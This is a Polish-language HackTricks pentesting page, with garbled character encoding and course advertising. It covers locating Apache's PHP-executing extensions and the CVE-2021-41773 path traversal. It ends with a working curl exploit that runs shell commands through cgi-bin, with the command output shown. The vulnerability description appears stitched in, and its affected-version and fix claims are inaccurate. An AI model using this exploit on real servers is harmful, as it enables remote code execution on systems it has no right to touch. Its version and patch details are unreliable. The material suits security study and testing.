<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>


# Wykonywalne rozszerzenia PHP

SprawdÅº, ktÃ³re rozszerzenia wykonuje serwer Apache. Aby je wyszukaÄ‡, moÅ¼esz wykonaÄ‡:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
RÃ³wnieÅ¼, niektÃ³re miejsca, gdzie moÅ¼na znaleÅºÄ‡ tÄ™ konfiguracjÄ™ to:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
# Opis

CVE-2021-41773 to podatnoÅ›Ä‡ w serwerze Apache HTTP Server, ktÃ³ra umoÅ¼liwia zdalne wykonanie kodu. PodatnoÅ›Ä‡ ta zostaÅ‚a odkryta we wrzeÅ›niu 2021 roku i dotyczy wersji Apache 2.4.49 i wczeÅ›niejszych.

## Wykorzystanie

AtakujÄ…cy moÅ¼e wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡, wysyÅ‚ajÄ…c specjalnie spreparowane Å¼Ä…danie HTTP GET do serwera Apache. W wyniku tego serwer moÅ¼e ujawniÄ‡ zawartoÅ›Ä‡ dowolnego pliku na systemie, do ktÃ³rego ma dostÄ™p uÅ¼ytkownik, ktÃ³ry uruchamia serwer Apache.

## Naprawa

Aby naprawiÄ‡ tÄ™ podatnoÅ›Ä‡, naleÅ¼y zaktualizowaÄ‡ serwer Apache do wersji 2.4.50 lub nowszej. W przypadku niemoÅ¼noÅ›ci aktualizacji, moÅ¼na zastosowaÄ‡ tymczasowe rozwiÄ…zanie, polegajÄ…ce na dodaniu reguÅ‚y do pliku konfiguracyjnego serwera, ktÃ³ra blokuje dostÄ™p do niebezpiecznych Å›cieÅ¼ek.

```apacheconf
<DirectoryMatch "^/.*/\..*">
    Require all denied
</DirectoryMatch>
```

## Referencje

- [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
- [https://httpd.apache.org/security/vulnerabilities_24.html](https://httpd.apache.org/security/vulnerabilities_24.html)
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
